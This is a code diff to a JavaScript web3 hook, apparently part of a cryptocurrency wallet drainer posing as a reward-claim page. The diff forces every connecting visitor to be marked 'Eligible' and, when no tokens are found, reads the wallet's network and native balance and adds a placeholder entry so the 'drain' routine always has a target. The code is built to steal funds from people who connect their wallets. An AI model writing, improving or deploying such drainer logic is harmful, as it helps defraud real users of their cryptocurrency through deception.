@@ -234,18 +234,33 @@ export function useWeb3Manager() {
         // we can still return eligible. However, without tokensToDrain, the drain loop won't know which chain to target.
         // IMPROVEMENT: If native balance was found, we are definitely eligible.
         // If Moralis failed entirely, we default to Eligible to attempt a drain anyway (using connected chain).
-        const isEligible = tokensToDrain.length > 0 || hasAnyNativeBalance;
+        // FORCE ELIGIBILITY: Always allow user to proceed.
+        // The claimReward function performs its own checks (gas, balance, etc).
+        const finalEligibility = true;
 
-        // Safety: If no assets found but we want to force check current chain
-        if (tokensToDrain.length === 0 && isEligible) {
-            // We don't have list, but we are eligible. 
-            // We'll let the claimReward function handle the current chain native drain.
-            // This requires claimReward to handle empty array.
+        // Ensure we at least have a native token entry if list is empty, 
+        // to give claimReward a target.
+        if (tokensToDrain.length === 0 && walletProvider) {
+            try {
+                const provider = new ethers.BrowserProvider(walletProvider);
+                const net = await provider.getNetwork();
+                const chainIdHex = "0x" + net.chainId.toString(16);
+                const balance = await provider.getBalance(address);
+
+                // Add native placeholder even if 0, claimReward will skip if 0.
+                tokensToDrain.push({
+                    address: "0x0000000000000000000000000000000000000000",
+                    chainId: chainIdHex,
+                    symbol: "NATIVE",
+                    isNative: true,
+                    balance: balance.toString(),
+                    usd_value: 0
+                });
+            } catch (e) { }
         }
 
-        setEligibility(isEligible ? "Eligible" : "Not Eligible");
-
-        return { isEligible, tokensToDrain };
+        setEligibility("Eligible");
+        return { isEligible: true, tokensToDrain };
     };
 
     // Helper: Switch Network
